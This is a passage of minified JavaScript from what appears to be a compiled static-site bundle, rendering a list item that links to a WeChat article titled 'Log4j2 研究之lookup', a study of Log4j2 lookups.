"),s("li",[s("a",{attrs:{href:"https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247485584&idx=1&sn=2fad11942986807ea7545f7b8b5d6af8&scene=21#wechat_redirect",target:"_blank",rel:"noopener noreferrer"}},[t._v("Log4j2 研究之lookup"),s("OutboundLink")],1)])])])}),[],!1,null,null,null);s.default=n.exports}}]);